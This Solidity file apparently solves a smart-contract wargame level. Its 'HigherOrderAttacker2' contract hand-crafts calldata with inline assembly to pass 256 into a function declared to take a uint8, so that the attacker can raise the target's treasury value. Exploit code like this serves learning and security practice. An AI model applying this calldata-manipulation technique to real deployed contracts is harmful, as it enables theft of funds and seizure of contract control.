// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
    function treasury() external view returns (uint256);
    function commander() external view returns (address);
}

contract HigherOrderAttacker2 {
    IHigherOrder public target;
    
    constructor(address _target) {
        target = IHigherOrder(_target);
    }
    
    function setTreasuryHigh() external {
        // Call registerTreasury with crafted calldata
        bytes memory data = abi.encodeWithSelector(
            bytes4(0x211c85ab), // registerTreasury selector
            uint8(1)
        );
        
        // Replace the bytes at position 4 with a value > 255
        assembly {
            let dataPtr := add(data, 0x20)
            mstore(add(dataPtr, 4), 0x0100) // 256
        }
        
        (bool success,) = address(target).call(data);
        require(success, "registerTreasury call failed");
    }
}